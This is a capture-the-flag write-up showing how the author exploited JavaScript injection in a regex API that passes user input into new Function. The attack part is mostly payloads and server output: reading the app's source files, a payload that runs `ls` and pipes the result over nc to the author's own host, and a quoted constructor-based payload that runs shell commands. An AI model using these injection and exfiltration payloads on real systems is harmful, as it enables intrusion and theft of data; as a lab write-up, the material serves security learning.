# CSRegex

Points: 100

I looked at the URL first. The format was:
```
GET http://chal.cybersecurityrumble.de:9876/api/regex/<pattern>/<flags>/<input>
```

Each parameter was Base64 encoded. Based on the information from the page, it
looks like `eval()` is being used. Eventually I found this worked:
```
' + process.cwd() + '
```

Unfortunately, doing the usual `require('fs')` trick does not work because it
says `require` is not defined. Not sure why.

After trying other things for a few hours, I eventually found this:
```
'+Object.getOwnPropertyNames(this)+'
```

This gave me:
```json
{ "result": "simpleFs" }
```

Proceeding on this thread:
```
'+Object.getOwnPropertyNames(this.simpleFs)+'
-> { "result": "length,prototype,exists,readFile,readFileSync,writeFile,writeFileSync,appendFile,appendFileSync,name" }

'+this.simpleFs+'
-> { "result": "class SimpleFs {\n static exists(path) {\n return new Promise((res, rej) => {\n fs.stat(path, (err, stats) => {\n if (err) return rej(err);\n if (!stats.isFile()) return rej('Not a file');\n return res();\n });\n });\n }\n\n static readFile(path) {\n return new Promise((res, rej) => {\n if (!fs.existsSync(path)) return rej('File not found');\n fs.readFile(path, { encoding: 'utf-8' }, (err, data) => {\n if (err) return rej(err);\n return res(data);\n });\n });\n }\n\n static readFileSync(path) {\n if (!fs.existsSync(path)) return rej('File not found');\n try {\n return fs.readFileSync(path, { encoding: 'utf-8' });\n } catch (ex) {\n return false;\n }\n }\n\n static writeFile(path, contents) {\n return new Promise((res, rej) => {\n if (fs.existsSync(path)) return rej('File already exists');\n fs.writeFile(path, contents, { encoding: 'utf-8' }, (err) => {\n if (err) return rej(err);\n return res();\n })\n });\n }\n\n static writeFileSync(path, contents) {\n if (fs.existsSync(path)) return rej('File already exists');\n try {\n fs.writeFileSync(path, contents, { encoding: 'utf-8' });\n return true;\n } catch (ex) {\n return false;\n }\n }\n\n static appendFile(path, contents) {\n return new Promise((res, rej) => {\n if (!fs.existsSync(path)) return rej('File not found');\n fs.appendFile(path, contents, { encoding: 'utf-8' }, (err) => {\n if (err) return rej(err);\n return res();\n });\n });\n }\n\n static appendFileSync(path, contents) {\n if (!fs.existsSync(path)) return rej('File not found');\n try {\n fs.appendFileSync(path, contents, { encoding: 'utf-8' });\n return true;\n } catch (ex) {\n return false;\n }\n }\n}" }

'+process.argv+'
-> { "result": "/usr/bin/node,/app/index.js" }

'+this.simpleFs.readFileSync('/app/index.js')+'
-> { "result": "var express = require('express');\nvar cors = require('cors');\n\nvar app = express();\nvar api = require('./api')\n\napp.use(cors());\n\nprocess.on('unhandledRejection', (reason, promise) => {\n console.log('Unhandled Rejection at:', reason.stack || reason)\n})\n\n\nprocess.on('uncaughtException', function (err) {\n console.error(err.stack);\n});\n\napp.use((req, res, next) => {\n res.header('Server', 'dunno');\n res.header('X-Powered-By', 'love <3');\n res.header('Level', (9000 + Math.random() * 1000).toFixed(0));\n next();\n});\n\n//Static\napp.use(express.static('dist'));\n\n//rest\napp.use('/api', api);\n\n//Troll\napp.use('/admin', function (req, res) {\n res.status(401).send();\n});\napp.use('/phpMyAdmin', function (req, res) {\n res.status(402).send();\n});\napp.use('/test.php', function (req, res) {\n res.status(403).send();\n});\n\n//Custom 404\napp.get('*', function (req, res) {\n res.status(404).send('notfound.jpeg');\n});\n\napp.listen(8080, () => {\n console.log(`Listening...`)\n});" }
```

Note this line: `var api = require('./api')`
```
'+this.simpleFs.readFileSync('/app/index.js')+'
-> { "result": "var express = require('express');\nvar router = express.Router();\nvar RegexEr = require('./regexer')\n\nrouter.get('/regex/:pattern/:flags/:input', (req, res) => {\n var params = {\n pattern: req.params.pattern,\n input: req.params.input,\n flags: req.params.flags\n };\n try {\n params.pattern = Buffer.from(req.params.pattern, 'base64').toString();\n params.input = Buffer.from(req.params.input, 'base64').toString().replace(/\\n/gm, \"\").trim();\n params.flags = Buffer.from(req.params.flags, 'base64').toString();\n RegexEr.process(params.pattern, params.flags, params.input)\n .then((result) => res.status(200).send({result: result}))\n .catch((err) => res.status(400).send({ error: err.message }));\n\n } catch (ex) {\n console.error(ex);\n res.status(400).send(JSON.stringify(ex));\n }\n\n});\n\nmodule.exports = router;" }

'+this.simpleFs.readFileSync('/app/regexer.js')+'
-> { "result": "const sfs = require('./simple-fs');\n\nconst LOGFILE = 'requests.log';\n\nclass RegexEr {\n constructor() {\n this.simpleFs = sfs;\n }\n process(pattern, flags, input) {\n return new Promise((res, rej) => {\n try {\n var str = `var _result = '${input}'.match(/${pattern}/${flags}); return _result;`;\n this.addLogLine(LOGFILE, str + '\\n');\n console.log(str);\n var fun = new Function(str);\n var result = fun.call(this);\n res(result);\n } catch (ex) {\n rej(ex);\n }\n });\n }\n addLogLine(logFile, content) {\n this.simpleFs.appendFile(logFile, content);\n }\n}\n\nconst REGEXER_INSTANCE = new RegexEr();\n\nmodule.exports = REGEXER_INSTANCE;" }

'+this.simpleFs.readFileSync('/app/leftover.js')+'
-> { "result": "class Utility {\n require(resource) {\n return new Promise((res, rej)=>{\n try {\n var module = require(resource);\n return res(module); \n } catch(ex) {\n return rej(ex);\n }\n });\n }\n isRunningOnWindows() {\n return process.platform.indexOf('win' === 0);\n }\n getUrlHost(url) {\n try{\n return new URL(url).hostname;\n } catch(ex){\n return null;\n }\n }\n}\n\nLEGACY_UTILS = new Utility();\n\nmodule.exports = LEGACY_UTILS;" }
```

The `require` function looks very interesting. If I can `require` the `fs`
module and call `readdirSync`, then I could figure out where the flag is.
Unfortunately, it returns a Promise object. I spent a few hours trying to figure
out how to resolve a promise synchronously and I eventually realized that it
was probably impossible. JS is stupid.

Finally, I tried to an exploit that did not require synchronous execution.
Instead of trying to make it return the string I wanted in the request, I would
make it run `ls` and send the output to a socket on my computer.

So next I made my router forward port 4445. Next I set up a listener on my
computer:
```
$ nc -lvp 4445
```

Then using my public IP, I used the following payload:
```
' + LEGACY_UTILS.require('child_process').then((cp) => { cp.exec ('ls | nc <my_public_ip> 4445') }, null) + '
```

I got output on my listener!
```
$ nc -lvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 193.10.78.34.bc.googleusercontent.com 44997 received!
api.js
csregex
dist
dockerfile
index.js
leftover.js
node_modules
package-lock.json
package.json
regexer.js
requests.log
simple-fs.js
```

Finally:
```
'+this.simpleFs.readFileSync('/app/dockerfile')+'
-> { "result": "from mhart/alpine-node:12\nWORKDIR /app\nCOPY . .\nRUN apk update\nRUN apk upgrade\nRUN apk add bash\nRUN apk add curl\nRUN npm install\nRUN chown root:root .\nRUN chmod -R 755 .\nRUN adduser -D -g '' server\nRUN touch requests.log\nRUN chown server:server requests.log\nRUN chmod +s /usr/bin/curl\nRUN echo 'CSR{r363x_15_fun_r363x_15_l0v3}' > /root/flaggerino_flaggeroni.toxt\nRUN chmod 640 /root/flaggerino_flaggeroni.toxt\nRUN chmod 744 /root\nUSER server\nEXPOSE 8080\nCMD [ \"node\", \"index.js\"]null" }
```

---

Note: somehow this person solved it
[like this](https://gist.github.com/po6ix/b5885264ee0128e8f14bc293396081b5).
I don't understand the JavaScript here but it works:
```
'+constructor.constructor("return process")().mainModule.require("child_process").execSync('cat * | grep CSR')+'
```
